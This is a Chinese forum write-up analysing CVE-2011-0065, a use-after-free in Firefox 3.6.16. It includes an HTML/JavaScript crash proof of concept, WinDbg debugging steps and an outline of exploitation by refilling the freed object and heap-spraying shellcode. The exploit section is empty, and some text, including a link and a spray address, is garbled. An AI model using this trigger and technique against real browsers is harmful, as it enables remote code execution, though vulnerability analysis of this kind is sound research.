
# [原创]CVE-2011-0065 Firefox mChannel UAF漏洞

**软件名称**： Firefox

**软件版本**：Firefox 3.6.16

**漏洞模块**：`xul.dll`

**漏洞编号**：CVE-2011-0065

**危害等级**：高危

**漏洞类型**：释放重引用

**威胁类型**：远程

# 1. 软件简介

Mozilla Firefox是一款非常流行的开源WEB浏览器。SeaMonkey是开源的Web浏览器、邮件和新闻组客户端、IRC会话客户端和HTML编辑器。

# 2. 漏洞成因

Mozilla Firefox 3.5.19之前版本，3.6.17之前的3.6.x版本以及SeaMonkey 2.0.14之前版本中存在释放后使用漏洞。远程攻击者可以借助与OBJECT's `mChannel`有关的向量执行任意代码。

# 3. 利用过程

## 3.0 windbg设置

首先添加windbg关于Firefox的符号表地址

![](https://bbs.kanxue.com/upload/attach/201703/738597_sc8j0oaqydd7vsj.png)

## 3.1 漏洞触发

### 3.1.1 poc

```
<html>

<body>

<object id="d"><object>

<script type="text/javascript">

var e;

e=document.getElementById("d");

 

e.QueryInterface(Components.interfaces.nsIChannelEventSink).onChannelRedirect(null,new Object('0c'),0);

e.data = "";

 

</script>

</body>

</html>
```

### 3.1.2 触发异常

运行FireFox并且用windbg附加它，然后运行刚才的Poc，断到异常处

![](https://bbs.kanxue.com/upload/attach/201703/738597_1oiooxwmnhdf7nv.png)

然后用`kv`指令查看此时的堆栈信息，可以看到栈顶的返回地址`68cf4e75`

![](https://bbs.kanxue.com/upload/attach/201703/738597_v5cf1y3ewm3cuoi.png)

用`ub`指令查看`0x68cf4e75`地址前面的指令，漏洞是出现在`xul.dll`模块中

![](https://bbs.kanxue.com/upload/attach/201703/738597_hzqmr658qppkot9.png)

根据C++成员函数`this`指针调用约定，可以知道上面的`ecx`是虚表函数，`eax`是对象地址，而`call dword ptr ds:[ecx+18]`调用的整是某个对象的方法，即虚函数。

查看`xul!nsObjectLoadingContent::LoadObject+0xf2`发现有两个同名函数。

![](https://bbs.kanxue.com/upload/attach/201703/738597_3k1qkjhdgh5qy9b.png)

根据上面触发漏洞时栈顶的返回地址`68cf4e75`可以知道这里调用的是：

Matched: `68cf4d6d xul!nsObjectLoadingContent::LoadObject (class nsIURI *, int, class nsCString *, int)`

因此，对`68cf4d6d`下断点：

`0:000> bp 68cf4d6d`

另外，从poc代码中可以看到关键函数`onChannelRedirect` 因此我们可以直接在winDbg中搜索函数，但是发现很多类里面都包含着`onChannelRedirect` 方法

![](https://bbs.kanxue.com/upload/attach/201703/738597_7j4waev9duweypy.png)

但是刚才我们已经找到了，触发漏洞的类是`xul!nsObjectLoadingContent`，通过搜索，该类里也包含`onChannelRedirect`方法，连同其参数也一并列了出来，前两个参数为类对象

![](https://bbs.kanxue.com/upload/attach/201703/738597_nkut3tkhd6qkq2c.png)

因此对`xul!nsObjectLoadingContent::onChannelRedirect`下断点，重新载入`poc.html`执行后，发现确实可以断下

![](https://bbs.kanxue.com/upload/attach/201703/738597_usm8qbl72q9erz7.png)

![](https://bbs.kanxue.com/upload/attach/201703/738597_w7nu3lkwmmfju1p.png)

查看此时它的三个参数，其中第二个参数是对象`067a3e90`，其余均为0

![](https://bbs.kanxue.com/upload/attach/201703/738597_fzquc6gw346at5x.png)

分析该函数的反汇编代码

![](https://bbs.kanxue.com/upload/attach/201703/738597_bwgdvyzrz0uhmvq.png)

上面的调试信息已经给出了源码文件的路径和行数，因此我们可以直接查看`nsObjectLoadingContent::onChannelRedirect`函数的源码，可以通过cdfK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3S2Y4i4K6u0W2L8h3!0*7K9h3I4D9j5g2)9J5k6h3!0J5k6#2)9J5c8Y4u0W2L8r3g2S2M7$3g2K6i4K6u0r3L8h3!0*7K9h3I4D9j5g2)9J5k6o6q4Q4x3X3f1&6i4K6u0W2x3W2)9J5c8X3k6A6L8r3g2Q4x3V1k6U0x3U0c8X3x3U0p5#2z5o6q4V1y4K6N6Q4x3V1k6U0L8$3&6@1k6h3&6@1i4K6u0r3j5X3q4K6k6g2)9J5c8Y4y4J5j5#2)9J5c8X3&6K6e0$3u0B7k6h3y4@1e0r3!0S2k6r3W2F1k6@1y4G2L8Y4c8W2L8Y4c8Q4x3X3g2U0M7s2l9`.获取在线代码

**NS_IMETHODIMP**

**nsObjectLoadingContent::OnChannelRedirect(**

**nsIChannel *aOldChannel,**

**nsIChannel *aNewChannel,**

**PRUint32**

**aFlags)**

**{**

**// If we're already busy with a new load, or have no load at all,**

**// cancel the redirect.**

**if(!mChannel || aOldChannel != mChannel)**

**{**

**return NS_BINDING_ABORTED;**

**}**

**if(mClassifier)**

**{**

**mClassifier->OnRedirect(aOldChannel, aNewChannel);**

**}**

**mChannel = aNewChannel;**

```
/******************************************************************************/
```

将新对象`067a3e90`赋予`mChannel`对象，但由于Firefox本身的垃圾回收机制，在`OnChannelRedirect`函数调用完毕后，它会回收不再使用的对象，即尽在本函数内使用`aNewChannel`对象，此时`mChannel`就成了悬挂指针

```
/******************************************************************************/
```

**return NS_OK;**

**}**

动态调试一下，先在`xul!nsObjectLoadingContent::LoadObject+0xfc`下断点，

`bp 68cf4d6d + fc`

![](https://bbs.kanxue.com/upload/attach/201703/738597_t9cpyl2t22o85bg.png)

执行后断下，可以发现这里引用的对象就是前面的`xul!nsObjectLoadingContent::OnChannelRedirect`的第二个参数值`0x0`

![](https://bbs.kanxue.com/upload/attach/201703/738597_l7zz06akbvob5op.png)

单步执行下去就可以出发异常，因此虚表指针被篡改，导致索引虚函数时出错，进而导致程序崩溃。

![](https://bbs.kanxue.com/upload/attach/201703/738597_bi71ofyzkh0g5ad.png)

## 3.2 漏洞利用

为了实现任意代码执行，需要在`mChannel`对象释放后，用可控数据覆盖，填充它，因此，可以在`nChannelRedirect`函数执行完成后，紧跟着申请一块相同的内存：

`e = document.getElementById("d");`

`e.QueryInterface(Components.interfaces.nsIChannelEventSink).onChannelRedirect(null,new Object,0)`

`fake_obj_addr = unescape("\x1C%u0c0c")`

执行后，虚表指针就会被`0x0c0c001c`填充，从而控制程序的执行流程

接下来只需要利用Heap Spray技术将shellcode喷射到`0x0c0c0034de`位置即可实现执行任意代码。

# 4. exploit
